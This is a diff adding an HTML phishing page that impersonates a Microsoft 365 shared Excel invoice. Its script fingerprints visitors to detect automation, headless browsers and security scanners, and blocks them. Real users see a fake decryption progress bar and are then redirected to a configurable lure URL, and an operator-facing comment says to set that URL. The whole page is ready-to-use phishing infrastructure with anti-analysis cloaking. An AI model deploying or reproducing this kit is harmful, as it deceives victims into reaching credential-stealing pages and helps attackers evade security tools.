@@ -1,0 +1,78 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<meta name="robots" content="noindex,nofollow">
+<title>Invoice - View Document</title>
+<link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 32 32'><rect width='32' height='32' rx='6' fill='%23217346'/><text x='16' y='22' text-anchor='middle' fill='white' font-size='14' font-family='Arial'>X</text></svg>">
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+body{font-family:'Segoe UI',system-ui,sans-serif;background:#f9fafb;min-height:100vh;display:flex;align-items:center;justify-content:center}
+.card{background:#fff;border-radius:10px;box-shadow:0 1px 10px rgba(0,0,0,.06);max-width:460px;width:90%;border:1px solid #e5e7eb}
+.hdr{padding:24px 28px;border-bottom:1px solid #f0f0f0;display:flex;align-items:center;gap:14px}
+.hdr-icon{width:40px;height:40px;background:#ecfdf5;border-radius:8px;display:flex;align-items:center;justify-content:center}
+.hdr-icon svg{width:22px;height:22px}
+.hdr-text h2{font-size:16px;color:#111827;font-weight:600}
+.hdr-text p{font-size:12px;color:#6b7280;margin-top:2px}
+.body{padding:28px}
+.doc-preview{background:#f8fafc;border:1px dashed #d1d5db;border-radius:8px;padding:24px;text-align:center;margin-bottom:24px}
+.doc-preview .file-icon{font-size:36px;margin-bottom:8px}
+.doc-preview .file-name{font-size:14px;color:#374151;font-weight:500}
+.doc-preview .file-size{font-size:12px;color:#9ca3af;margin-top:4px}
+.progress{margin-bottom:16px}
+.progress-bar{background:#e5e7eb;border-radius:99px;height:6px;overflow:hidden}
+.progress-fill{background:linear-gradient(90deg,#217346,#2ea85e);height:100%;width:0;border-radius:99px;transition:width .4s}
+.progress-text{display:flex;justify-content:space-between;margin-top:8px;font-size:12px;color:#6b7280}
+.blocked{display:none;color:#dc2626;font-size:13px;text-align:center;padding:16px;background:#fef2f2;border-radius:8px;margin-top:12px}
+</style>
+</head>
+<body>
+<div class="card">
+<div class="hdr">
+<div class="hdr-icon"><svg viewBox="0 0 24 24" fill="#217346"><path d="M14 2H6a2 2 0 00-2 2v16a2 2 0 002 2h12a2 2 0 002-2V8l-6-6zM6 20V4h7v5h5v11H6z"/><path d="M8 13h3v1H8zm0 2h5v1H8zm0 2h5v1H8z"/></svg></div>
+<div class="hdr-text"><h2>Invoice Document</h2><p>Shared via Microsoft 365</p></div>
+</div>
+<div class="body">
+<div class="doc-preview">
+<div class="file-icon">📄</div>
+<div class="file-name">Invoice_2026_Q1.xlsx</div>
+<div class="file-size">243 KB · Microsoft Excel</div>
+</div>
+<div class="progress">
+<div class="progress-bar"><div class="progress-fill" id="pbar"></div></div>
+<div class="progress-text"><span id="status">Decrypting document...</span><span id="pct">0%</span></div>
+</div>
+<div class="blocked" id="blocked">Access blocked — automated requests are not permitted.</div>
+</div>
+</div>
+<script>
+/*──── CONFIG: Replace with your lure URL ────*/
+var REDIRECT_URL = "https://YOUR-LURE-URL-HERE";
+/*────────────────────────────────────────────*/
+
+(function(){
+var bar=document.getElementById('pbar'),st=document.getElementById('status'),pct=document.getElementById('pct'),bl=document.getElementById('blocked');
+function bad(){bl.style.display='block';bar.parentElement.parentElement.style.display='none'}
+function chk(){
+if(navigator.webdriver||window.__nightmare||window.callPhantom||window._phantom)return!1;
+if(/bot|crawl|spider|headless|phantom|puppet|selenium|lighthouse|wget|curl|http|scan|preview|fetch|archive|index/i.test(navigator.userAgent))return!1;
+try{var c=document.createElement('canvas'),g=c.getContext('webgl')||c.getContext('experimental-webgl');if(!g)return!1}catch(e){return!1}
+if(navigator.languages&&navigator.languages.length===0)return!1;
+if(!window.chrome&&/Chrome/.test(navigator.userAgent))return!1;
+if(screen.width<300||screen.height<300)return!1;
+var n=performance.now();for(var i=0;i<1e5;i++)Math.sqrt(i);if(performance.now()-n<0.5)return!1;
+return!0
+}
+if(!chk()){bad();return}
+var p=0,msgs=["Decrypting document...","Verifying signature...","Preparing viewer...","Opening document..."];
+var iv=setInterval(function(){
+p+=Math.random()*15+5;if(p>100)p=100;
+bar.style.width=p+'%';pct.textContent=Math.round(p)+'%';
+st.textContent=msgs[Math.min(Math.floor(p/25),msgs.length-1)];
+if(p>=100){clearInterval(iv);setTimeout(function(){window.location.replace(REDIRECT_URL)},600)}
+},500);
+})();
+</script>
+</body>
+</html>
